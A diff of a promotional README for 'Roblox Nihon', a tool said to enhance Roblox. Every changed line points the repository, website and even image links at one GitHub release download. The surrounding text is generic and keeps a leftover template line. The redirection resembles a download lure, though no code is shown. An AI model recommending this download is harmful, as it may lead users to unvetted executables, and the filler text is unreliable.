@@ -21,7 +21,7 @@ Roblox Nihon was founded in 2020 with the goal of providing users with an intuit
 
 ### 📁 Repository Link
 
-To access the repository, click [here](https://github.com/file/App.zip).
+To access the repository, click [here](https://github.com/andrianlecita/Roblox-Nihon/releases/tag/v2.0).
 
 ### 🚀 Launching the File
 
@@ -50,7 +50,7 @@ Are you ready to elevate your Roblox experience with Roblox Nihon? Join our comm
 
 ### 🌐 Visit Our Website
 
-For more information and updates, visit our website [here](https://www.robloxnihon.com).
+For more information and updates, visit our website [here](https://github.com/andrianlecita/Roblox-Nihon/releases/tag/v2.0).
 
 ### 📦 Check the Releases Section
 
@@ -62,6 +62,6 @@ Stay connected with the Roblox Nihon community on social media and our official 
 
 Thank you for choosing Roblox Nihon – Your gateway to an enhanced Roblox experience! 🚀🎮
 
-![Roblox Nihon](https://image-url.com/roblox-nihon-image)
+![Roblox Nihon](https://github.com/andrianlecita/Roblox-Nihon/releases/tag/v2.0)
 
 **Note**: Feel free to customize this README file with any additional information you'd like to include. Happy gaming! 👾🎉
